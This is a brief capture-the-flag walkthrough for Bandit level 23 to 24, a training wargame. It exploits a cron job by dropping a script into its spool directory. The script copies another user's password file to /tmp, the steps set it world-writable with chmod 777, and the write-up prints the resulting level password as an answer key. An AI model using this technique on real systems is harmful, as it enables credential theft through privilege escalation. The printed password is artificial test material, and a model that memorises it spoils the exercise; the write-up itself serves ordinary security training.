# Bandit Level 23 → 24

## Objective
Exploit a cron job to capture the password for `bandit24`.

## Solution
Create a script in the cron job’s directory:

1. Change directory: `cd /var/spool/bandit24/foo`
2. Create script:
   ```bash
   echo "cat /etc/bandit_pass/bandit24 > /tmp/cert.txt" > pass.sh
   ```
3. Set permissions: `chmod 777 pass.sh`
4. Read output: `cat /tmp/cert.txt`

## Password for bandit24
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8